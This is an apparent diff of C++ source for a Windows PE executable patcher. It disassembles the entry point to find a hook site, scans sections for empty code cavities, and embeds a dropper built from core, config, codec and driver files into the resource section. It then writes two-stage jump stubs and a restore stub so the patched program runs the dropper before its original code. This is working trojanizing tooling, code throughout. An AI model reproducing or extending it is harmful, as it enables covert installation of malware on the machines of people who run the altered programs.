+				else if (_disasm.Argument2.Memory.Displacement)
+					va = _disasm.Argument2.Memory.Displacement;
+				
+				// std::size_t offset = offset((int) va - imageBase());
+				
+				try {
+					IATEntry const & entry = getIATEntry(va);
+					string va_str = IATEntry::str(entry);
+					printf("%.8X(%02d) %s %s\n",(int) _disasm.VirtualAddr, len, &_disasm.Instruction.Mnemonic, va_str.c_str());
+				} catch(IATEntryNotFound) {
+					printf("*** %.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+					if (va) {
+						printf(" --- HOOKING @ %08x -- \n", va);
+						unsigned char* newEP = atRVA(va - imageBase());
+						
+						_hookPointer.stage1.ptr = (char*) newEP;
+						_hookPointer.stage1.va = va;
+						
+						return;
+					}
+				}
+				
+				_disasm.EIP = _disasm.EIP + len;
+				_disasm.VirtualAddr = _disasm.VirtualAddr + len;
+			}
+			else 
+			{
+				(void) printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+				_disasm.EIP = _disasm.EIP + len;
+				_disasm.VirtualAddr = _disasm.VirtualAddr + len;	
+			}
+			
+			if (_disasm.EIP >= (long) end)  {
+				return;
+			}
+		}
+		
+		else {
+			return;
+		}
+	}
+	return;
+}
+
+void PEObject::_findCavities( GenericSection * const section )
+{
+	cout << "Looking for cavities in section " << section->Name() << endl;
+	char *ptr = section->data();
+	char *end = section->data() + section->VirtualSize();
+	
+	DWORD startPtr = 0;
+	DWORD startVA = 0;
+	DWORD lastVA = 0;
+	
+	while (ptr < end)
+	{
+		if (*ptr == 0) {
+			DWORD VA = section->VirtualAddress() + ( (DWORD)ptr - (DWORD)section->data() ) + imageBase();
+			
+			if (VA - lastVA  == 1) {
+				lastVA = VA;
+			} else {
+				size_t size = lastVA - startVA + 1;
+				if (size > 5) {
+					DWORD IatVA = getSection(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualAddress() + imageBase();
+					DWORD IatSize = getSection(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualSize();
+					
+					if (startVA + size < IatVA || startVA > IatVA + IatSize) {
+						Cavity cavity;
+						cavity.va = startVA;
+						cavity.size = size;
+						cavity.ptr = (char*) startPtr;
+						_cavities.push_back(cavity);
+					}					
+				}
+				
+				startPtr = (DWORD) ptr;
+				startVA = VA;
+				lastVA = VA;
+			}
+		}
+		ptr++;
+	}
+	
+	size_t size = lastVA - startVA + 1;
+	if (size > 5) {
+		Cavity cavity;
+		cavity.va = startVA;
+		cavity.size = size;
+		cavity.ptr = (char*) startPtr;
+		_cavities.push_back(cavity);
+	}
+	
+	std::sort(_cavities.begin(), _cavities.end(), compareCavity);
+	BOOST_FOREACH( Cavity c, _cavities ) 
+		printCavity(c);
+	
+	cout << endl;
+}
+
+bool PEObject::_parseText()
+{
+	unsigned char* ep = atRVA(epRVA());
+	GenericSection* section = findSection(epRVA());
+	
+	// _findCavities( section );
+	_disassembleCode( ep, (unsigned char*) ep + 0x400, ep, epVA() );
+	
+	return true;
+}
+
+#define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
+
+bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir )
+{
+	GenericSection* epSection = findSection(ntHeaders()->OptionalHeader.AddressOfEntryPoint);
+	DWORD displacement = rand() % (ntHeaders()->OptionalHeader.AddressOfEntryPoint - epSection->VirtualAddress() - 5);
+	_hookPointer.stage2.ptr = epSection->data() + displacement;
+	_hookPointer.stage2.va = ntHeaders()->OptionalHeader.ImageBase + epSection->VirtualAddress() + displacement;
+	
+	if (_hookPointer.stage1.ptr == NULL)
+		throw std::exception("No valid hook location found.");
+	
+	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
+	if (!targetSection)
+		throw std::exception("Cannot find resource section.");
+	
+	DropperObject dropper(*this);
+	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, 5);
+	dropper.setPatchCode(1, _hookPointer.stage2.va, _hookPointer.stage2.ptr, 5);
+	
+	if ( false == dropper.build(core, config, codec, driver, installDir) )
+		throw std::exception("Dropper build failed.");
+	
+	// base size is original resource section
+	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
+	
+	char* sectionData = NULL;
+	try {
+		sectionData = new char[ sectionSize ];
+	} catch (...) {
+		throw std::exception("Cannot allocate memory for new section.");
+	}
+	
+	char* ptr = sectionData;
+	memcpy(ptr, targetSection->data(), targetSection->SizeOfRawData());
+	ptr += alignToDWORD(targetSection->SizeOfRawData());
+	
+	// calculate dropper offset in section
+	DWORD dropperSkew = ptr - sectionData;
+
+	DWORD epVA = 
+		ntHeaders()->OptionalHeader.ImageBase 
+		+ targetSection->VirtualAddress() 
+		+ dropperSkew 
+		+ dropper.epOffset();
+	cout << "*** ENTRY POINT VA 0x" << hex << epVA << endl;
+
+	// fix restore stub
+	DWORD restoreVA =
+		ntHeaders()->OptionalHeader.ImageBase 
+		+ targetSection->VirtualAddress() 
+		+ dropperSkew 
+		+ dropper.restoreStubOffset();
+
+	cout << "*** RESTORE STUB VA 0x" << hex << restoreVA << endl;
+	
+	// copy dropper
+	memcpy(ptr, dropper.data(), dropper.size());
+	
+	AsmJit::Assembler restoreStub;
+	restoreStub.pushfd();
+	restoreStub.pushad();
+	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - restoreVA) );
+	restoreStub.popad();
+	restoreStub.popfd();
+	restoreStub.jmp( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (_hookPointer.stage1.va - restoreVA) );
+	
+	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
+	
+	ptr += alignToDWORD(dropper.size());
+	sectionSize = ptr - sectionData;
+	
+	cout << "Dropper size " << dec << dropper.size() << endl;
+	
+	// write to section
+	cout << "Dropper section writing " << dec << sectionSize << " bytes of data [0x" << hex << (DWORD)sectionData << "] into new section." << endl;
+	try {
+		targetSection->SetData(sectionData, sectionSize);
+	} catch (...) {
+		throw std::exception("Cannot allocate memory for new section.");
+	}
+	targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
+	
+	AsmJit::Assembler stage1stub;
+	stage1stub.jmp( ((DWORD)_hookPointer.stage1.ptr) + (_hookPointer.stage2.va - _hookPointer.stage1.va) );
+	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
+	
+	AsmJit::Assembler stage2stub;
+	stage2stub.jmp( ((DWORD)_hookPointer.stage2.ptr) + (restoreVA - _hookPointer.stage2.va) );
+	stage2stub.relocCode( (void*) _hookPointer.stage2.ptr );
+	
 	return true;
 }
